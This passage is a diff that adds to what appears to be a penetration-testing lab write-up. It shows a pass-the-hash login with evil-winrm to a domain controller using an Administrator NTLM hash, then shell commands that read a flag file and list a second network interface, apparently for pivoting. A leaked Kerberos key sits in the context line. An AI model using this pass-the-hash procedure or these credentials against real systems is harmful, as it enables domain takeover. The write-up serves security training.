@@ -2543,3 +2543,82 @@ Administrator:des-cbc-md5:61e31c8c2c0bd9cd
 [*] Cleaning up... 
 
 ```
+
+Domain Admin:
+
+```
+evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2  
+                                        
+Evil-WinRM shell v4.1
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                           
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> ls
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/2/2022  12:11 AM                3D Objects
+d-r---         6/2/2022  12:11 AM                Contacts
+d-r---         6/2/2022  12:11 AM                Desktop
+d-r---         6/2/2022  12:11 AM                Documents
+d-r---         6/2/2022  12:11 AM                Downloads
+d-r---         6/2/2022  12:11 AM                Favorites
+d-r---         6/2/2022  12:11 AM                Links
+d-r---         6/2/2022  12:11 AM                Music
+d-r---         6/2/2022  12:11 AM                Pictures
+d-r---         6/2/2022  12:11 AM                Saved Games
+d-r---         6/2/2022  12:11 AM                Searches
+d-r---         6/2/2022  12:11 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/1/2022  11:34 AM             32 flag.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
+7c09eb1fff981654a3bb3b4a4e0d176a
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
+
+```
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::cdfb:a651:6fc3:b81f%4
+   IPv4 Address. . . . . . . . . . . : 172.16.8.3
+   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+   Default Gateway . . . . . . . . . : 172.16.8.1
+
+Ethernet adapter Ethernet1:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::d4f4:3de1:ad36:5fdf%7
+   IPv4 Address. . . . . . . . . . . : 172.16.9.3
+   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+   Default Gateway . . . . . . . . . : 172.16.9.1
+
+```
